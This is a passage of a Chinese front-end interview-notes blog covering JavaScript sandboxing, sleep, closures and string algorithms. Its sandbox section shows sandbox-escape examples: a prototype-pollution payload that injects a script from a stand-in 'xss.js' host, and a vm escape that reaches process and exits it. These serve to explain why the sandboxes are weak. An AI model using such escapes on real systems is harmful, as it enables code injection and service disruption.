  function addZero(i) &#123;</span><br><span class="line">              return i &lt; 10 ? &quot;0&quot; + i: i + &quot;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          function countDown() &#123;</span><br><span class="line">              var nowtime = new Date();</span><br><span class="line">              var endtime = new Date(&quot;2019/03/16,17:57:00&quot;);</span><br><span class="line">              var lefttime = parseInt((endtime.getTime() - nowtime.getTime()) / 1000);</span><br><span class="line">              var d = parseInt(lefttime / (24*60*60))</span><br><span class="line">              var h = parseInt(lefttime / (60 * 60) % 24);</span><br><span class="line">              var m = parseInt(lefttime / 60 % 60);</span><br><span class="line">              var s = parseInt(lefttime % 60);</span><br><span class="line">              d = addZero(d)</span><br><span class="line">              h = addZero(h);</span><br><span class="line">              m = addZero(m);</span><br><span class="line">              s = addZero(s);</span><br><span class="line">              document.querySelector(&quot;.count&quot;).innerHTML = `活动倒计时  $&#123;d&#125;天 $&#123;h&#125; 时 $&#123;m&#125; 分 $&#123;s&#125; 秒`;</span><br><span class="line">              if (lefttime &lt;= 0) &#123;</span><br><span class="line">                  document.querySelector(&quot;.count&quot;).innerHTML = &quot;活动已结束&quot;;</span><br><span class="line">                  return;</span><br><span class="line">              &#125;</span><br><span class="line">              setTimeout(countDown, 1000);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="沙箱隔离怎么做的什么原理-TODO"><a href="#沙箱隔离怎么做的什么原理-TODO" class="headerlink" title="沙箱隔离怎么做的什么原理 [TODO]"></a>沙箱隔离怎么做的什么原理 [TODO]</h1><p>沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。<br><strong>实现沙箱的三种方法</strong></p><ol><li>借助with + new Function</li></ol><blockquote><p>首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为<font color="#FF00FF">代码内部可以沿着作用域链往上找，篡改全局变量</font>，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可<font color="#FF8C00">以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”</font>：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function compileCode (src) &#123;      </span><br><span class="line">  src = &#x27;with (exposeObj) &#123;&#x27; + src + &#x27;&#125;&#x27;    </span><br><span class="line">  return new Function(&#x27;exposeObj&#x27;, src)     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下里你要做的是，就是<font color="#FF00FF">暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问</font>。<font color="#FF8C00">通过es6提供的proxy特性</font>，可以获取到对对象上的所有改写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function compileCode (src) &#123;      </span><br><span class="line">  src = `with (exposeObj) &#123; $&#123;src&#125; &#125;`    </span><br><span class="line">  return new Function(&#x27;exposeObj&#x27;, src)     </span><br><span class="line">&#125;    </span><br><span class="line">function proxyObj(originObj)&#123;    </span><br><span class="line">    let exposeObj = new Proxy(originObj,&#123;    </span><br><span class="line">        has:(target,key)=&gt;&#123;    </span><br><span class="line">            if([&quot;console&quot;,&quot;Math&quot;,&quot;Date&quot;].indexOf(key)&gt;=0)&#123;    </span><br><span class="line">                return target[key]    </span><br><span class="line">            &#125;    </span><br><span class="line">            if(!target.hasOwnProperty(key))&#123;    </span><br><span class="line">                throw new Error(`Illegal operation for key $&#123;key&#125;`)    </span><br><span class="line">            &#125;    </span><br><span class="line">            return target[key]    </span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)    </span><br><span class="line">    return exposeObj    </span><br><span class="line"></span><br><span class="line">&#125;    </span><br><span class="line">function createSandbox(src,obj)&#123;    </span><br><span class="line"> let proxy = proxyObj(obj)    </span><br><span class="line"> compileCode(src).call(proxy,proxy) //绑定this 防止this访问window    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const testObj = &#123;    </span><br><span class="line">    value:1,    </span><br><span class="line">    a:&#123;    </span><br><span class="line">        b:    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">createSandbox(&quot;value=&#x27;haha&#x27;;console.log(a)&quot;,testObj)</span><br></pre></td></tr></table></figure><p>看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">createSandbox(`    </span><br><span class="line">a.b.__proto__.toString = ()=&gt;&#123;    </span><br><span class="line"> new (()=&gt;&#123;&#125;).constructor(&quot;var script = document.createElement(&#x27;script&#x27;);    </span><br><span class="line"> script.src = &#x27;http://xss.js&#x27;;</span><br><span class="line"> script.type = &#x27;text/javascript&#x27;;    </span><br><span class="line"> document.body.appendChild(script);&quot;)()    </span><br><span class="line">&#125;</span><br><span class="line">`,testObj)    </span><br><span class="line">console.log(testObj.a.b.__proto__.toString())</span><br></pre></td></tr></table></figure><p>例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。</p><p>你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;).__proto__.toString= ()=&gt;&#123;console.log(111)&#125;;</span><br></pre></td></tr></table></figure><p>可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。<br>2. 借助iframe实现沙箱</p><p>前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox src=&quot;...&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>但是这也会带来一些限制：</p><ul><li>script脚本不能执行</li><li>不能发送ajax请求</li><li>不能使用本地存储，即localStorage,cookie等</li><li>不能创建新的弹窗和window</li><li>不能发送表单</li><li>不能加载额外插件比如flash等</li></ul><p><strong>可以对这个iframe标签进行一些配置：</strong></p><p><img src="http://files.shanqianche.cn/20228/1659604025363.png" alt="允许的操作"><br>接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。</p><p>1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。<br>2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。<br>3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制</p><p>简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。</p><ol start="3"><li>nodejs中的沙箱</li></ol><p>odejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">const x = 1;    </span><br><span class="line">const sandbox = &#123; x: 2 &#125;;    </span><br><span class="line">vm.createContext(sandbox); // Contextify the sandbox.    </span><br><span class="line">const code = &#x27;x += 40; var y = 17;&#x27;;    </span><br><span class="line">vm.runInContext(code, sandbox);    </span><br><span class="line">console.log(sandbox.x); // 42    </span><br><span class="line">console.log(sandbox.y); // 17    </span><br><span class="line">console.log(x); // 1;   y is not defined.</span><br></pre></td></tr></table></figure><p>vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。</p><p>但是vm是绝对安全的吗？不一定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">vm.runInNewContext(&quot;this.constructor.constructor(&#x27;return process&#x27;)().exit()&quot;)</span><br></pre></td></tr></table></figure><p>通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let ctx = Object.create(null);    </span><br><span class="line">ctx.a = 1; // ctx上不能包含引用类型的属性    </span><br><span class="line">vm.runInNewContext(&quot;this.constructor.constructor(&#x27;return process&#x27;)().exit()&quot;, ctx);</span><br></pre></td></tr></table></figure><p>让我们来看一下TSW中是怎么使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);    </span><br><span class="line">const SbFunction = vm.runInNewContext(&#x27;(Function)&#x27;, Object.create(null));        // 沙堆    </span><br><span class="line">...    </span><br><span class="line">if (opt.jsonpCallback) &#123;    </span><br><span class="line">  code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`;    </span><br><span class="line">  obj = new SbFunction(code)();    </span><br><span class="line">&#125;     </span><br><span class="line">...    </span><br></pre></td></tr></table></figure><p>通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。</p><h1 id="实现一个-JS-的sleep"><a href="#实现一个-JS-的sleep" class="headerlink" title="实现一个 JS 的sleep"></a>实现一个 JS 的sleep</h1><ol><li>普通版</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sleep(sleepTime) &#123;</span><br><span class="line">    for(var start = new Date; new Date - start &lt;= sleepTime;) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">var t1 = +new Date()</span><br><span class="line">sleep(3000)</span><br><span class="line">var t2 = +new Date()</span><br><span class="line">console.log(t2 - t1)</span><br></pre></td></tr></table></figure><p>优点：简单粗暴，通俗易懂。<br>缺点：这是最简单粗暴的实现，确实 sleep 了，也确实卡死了，CPU 会飙升、<br>2. Promise 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function sleep(time) &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, time))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep(3000).then(() =&gt; &#123;</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>优点：这种方式实际上是用了 setTimeout，没有形成进程阻塞，不会造成性能和负载问题。<br>缺点：虽然不像 callback 套那么多层，但仍不怎么美观，而且当我们需要在某过程中需要停止执行（或者在中途返回了错误的值），还必须得层层判断后跳出，非常麻烦，而且这种异步并不是那么彻底，还是看起来别扭<br>3. Async/Await 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function sleep(delay) &#123;</span><br><span class="line">  return new Promise(reslove =&gt; &#123;</span><br><span class="line">    setTimeout(reslove, delay)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">!async function test() &#123;</span><br><span class="line">  const t1 = +new Date()</span><br><span class="line">  await sleep(3000)</span><br><span class="line">  const t2 = +new Date()</span><br><span class="line">  console.log(t2 - t1)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>缺点： ES7 语法存在兼容性问题，有 babel 一切兼容性都不是问题<br><strong>更优雅的写法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function sleep (time) &#123;</span><br><span class="line">  return new Promise((resolve) =&gt; setTimeout(resolve, time));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 用法</span><br><span class="line">sleep(500).then(() =&gt; &#123;</span><br><span class="line">    // 这里写sleep之后需要去做的事情</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>不要忘了开源的力量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const sleep = require(&quot;sleep&quot;)</span><br><span class="line">const t1 = +new Date()</span><br><span class="line">sleep.msleep(3000)</span><br><span class="line">const t2 = +new Date()</span><br><span class="line">console.log(t2 - t1)</span><br></pre></td></tr></table></figure><p>优点：能够实现更加精细的时间精确度，而且看起来就是真的 sleep 函数，清晰直白。</p><h1 id="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"><a href="#实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路" class="headerlink" title="实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路"></a>实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路</h1><blockquote><p>数组算法中提到过</p></blockquote><h1 id="function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组"><a href="#function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组" class="headerlink" title="function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组"></a>function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</h1><p><strong>把考点拆成了4个小项；需要用递归算法实现</strong>：<br>a) 生成一个长度为n的空数组arr。<br>b) 生成一个（min－max）之间的随机整数rand。<br>c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环]<br>d) 最终输出一个长度为n，且内容不重复的数组arr。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function buildArray(arr, n, min, max) &#123;</span><br><span class="line">    var num = Math.floor(Math.random() * (max - min + 1)) + min;</span><br><span class="line">    if (!arr.includes(num)) &#123; arr.push(num); &#125;</span><br><span class="line">    return arr.length === n ? arr : buildArray(arr, n, min, max);</span><br><span class="line">&#125;</span><br><span class="line">var result = buildArray([], 5, 2, 32);</span><br><span class="line">console.table(result);</span><br></pre></td></tr></table></figure><h1 id="闭包的理解"><a href="#闭包的理解" class="headerlink" title="闭包的理解"></a>闭包的理解</h1><blockquote><p>一个函数和<font color="#FF8C00">对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）</font>， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。<font color="#FF00FF">在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。</font></p></blockquote><p><strong>闭包的特点：</strong></p><ul><li>让外部访问函数内部变量成为可能；</li><li>可以避免使用全局变量，防止全局变量污染；</li><li>可以让局部变量常驻在内存中；</li><li>会造成内存泄漏（有一块内存空间被长期占用，而不被释放）</li></ul><p><strong>应用场景</strong></p><ol><li>埋点（是网站分析的一种常用的数据采集方法）计数器</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function count() &#123;</span><br><span class="line">    var num = 0;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        return ++num</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var getNum = count();</span><br><span class="line">var getNewNum = count();</span><br><span class="line">document.querySelectorAll(&#x27;button&#x27;)[0].onclick = function()&#123;</span><br><span class="line">    console.log(&#x27;点击加入购物车次数： &#x27;+getNum());</span><br><span class="line">&#125;</span><br><span class="line">document.querySelectorAll(&#x27;button&#x27;)[1].onclick = function()&#123;</span><br><span class="line">    console.log(&#x27;点击付款次数： &#x27;+getNewNum());</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><ol start="2"><li>事件+循环</li></ol><p>按照以下方式添加事件，<font color="#FF00FF">打印出来的i不是按照序号的形成</font>原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var lis = document.querySelectorAll(&#x27;li&#x27;);</span><br><span class="line">for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">         lis[i].onclick = function () &#123;</span><br><span class="line">             alert(i)</span><br><span class="line">         &#125;       </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>解决办法：</strong><br>使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var lis = document.querySelectorAll(&#x27;li&#x27;);  </span><br><span class="line">for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">     (function (j) &#123;</span><br><span class="line">                lis[j].onclick = function () &#123;</span><br><span class="line">                    alert(j)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)(i)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="字符串中的单词逆序输出（手写）"><a href="#字符串中的单词逆序输出（手写）" class="headerlink" title="字符串中的单词逆序输出（手写）"></a>字符串中的单词逆序输出（手写）</h1><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">     return str.split(&quot;&quot;).reverse().join(&quot;&quot;) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        var i=str.length;</span><br><span class="line">        var nstr = &quot;&quot;; </span><br><span class="line">        i=i-1; </span><br><span class="line">        for (var x = i; x &gt;=0; x--) &#123; </span><br><span class="line">                nstr+=str.charAt(x)</span><br><span class="line">        &#125;</span><br><span class="line">        return nstr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        if(str.length == 0)return null; </span><br><span class="line">        var i = str.length; </span><br><span class="line">        var dstr = &quot;&quot;; </span><br><span class="line">        while(--i &gt;= 0) </span><br><span class="line">        &#123; </span><br><span class="line">            dstr += str.charAt(i);  </span><br><span class="line">        &#125; </span><br><span class="line">        return dstr; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法四：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">    return str.split(&#x27;&#x27;).reduce((prev, next) =&gt; next + prev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法五：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">        var newstr=&quot;&quot;;</span><br><span class="line">           for(var i=0;i&lt;str.length;i++)&#123;</span><br><span class="line">               newstr=str.charAt(i)+newstr;</span><br><span class="line">           &#125;</span><br><span class="line">           return newstr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法六：【TODO】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function strReverse(str) &#123;</span><br><span class="line">            if(str.length===1)&#123;</span><br><span class="line">                return str</span><br><span class="line">            &#125;</span><br><span class="line">            return str.slice(-1)+strReverse(str.slice(0,-1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="给定一个字符串，请你找出其中不含有重复字符的最长子串的长度"><a href="#给定一个字符串，请你找出其中不含有重复字符的最长子串的长度" class="headerlink" title="给定一个字符串，请你找出其中不含有重复字符的最长子串的长度"></a>给定一个字符串，请你找出其中不含有重复字符的最长子串的长度</h1><p>对字符串进行遍历，使用String.prototype.indexOf()实时获取遍历过程中的无重复子串并存放于str，并保存当前状态最长无重复子串的长度为res，当遍历结束时，res的值即为无重复字符的最长子串的长度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @param &#123;string&#125; s</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> */</span><br><span class="line">var lengthOfLongestSubstring = function(s) &#123;</span><br><span class="line">    var res = 0; // 用于存放当前最长无重复子串的长度</span><br><span class="line">    var str = &quot;&quot;; // 用于存放无重复子串</span><br><span class="line">    var len = s.length;</span><br><span class="line">    for(var i = 0; i &lt; len; i++) &#123;</span><br><span class="line">      var char = s.charAt(i);</span><br><span class="line">      var index = str.indexOf(char);</span><br><span class="line">      if(index === -1) &#123;</span><br><span class="line">        str += char;</span><br><span class="line">        res = res &lt; str.length ? str.length : res;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        str = str.substr(index + 1) + char;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return res; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="去掉字符串前后的空格"><a href="#去掉字符串前后的空格" class="headerlink" title="去掉字符串前后的空格"></a>去掉字符串前后的空格</h1><p><strong>第五种方法在处理长字符串时效率最高</strong></p><ol><li>循环检查替换</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//供使用者调用  </span><br><span class="line">function trim(s)&#123;  </span><br><span class="line">    return trimRight(trimLeft(s));  </span><br><span class="line">&#125;  </span><br><span class="line">//去掉左边的空白  </span><br><span class="line">function trimLeft(s)&#123;  </span><br><span class="line">    if(s == null) &#123;  </span><br><span class="line">        return &quot;&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">    var whitespace = new String(&quot; \t\n\r&quot;);  </span><br><span class="line">    var str = new String(s);  </span><br><span class="line">    if (whitespace.indexOf(str.charAt(0)) != -1) &#123;  </span><br><span class="line">        var j=0, i = str.length;  </span><br><span class="line">        while (j &lt; i &amp;&amp; whitespace.indexOf(str.charAt(j)) != -1)&#123;  </span><br><span class="line">            j++;  </span><br><span class="line">        &#125;  </span><br><span class="line">        str = str.substring(j, i);  </span><br><span class="line">    &#125;  </span><br><span class="line">    return str;  </span><br><span class="line">&#125;  </span><br><span class="line">//去掉右边的空白 www.2cto.com </span><br><span class="line">function trimRight(s)&#123;  </span><br><span class="line">    if(s == null) return &quot;&quot;;  </span><br><span class="line">    var whitespace = new String(&quot; \t\n\r&quot;);  </span><br><span class="line">    var str = new String(s);  </span><br><span class="line">    if (whitespace.indexOf(str.charAt(str.length-1)) != -1)&#123;  </span><br><span class="line">        var i = str.length - 1;  </span><br><span class="line">        while (i &gt;= 0 &amp;&amp; 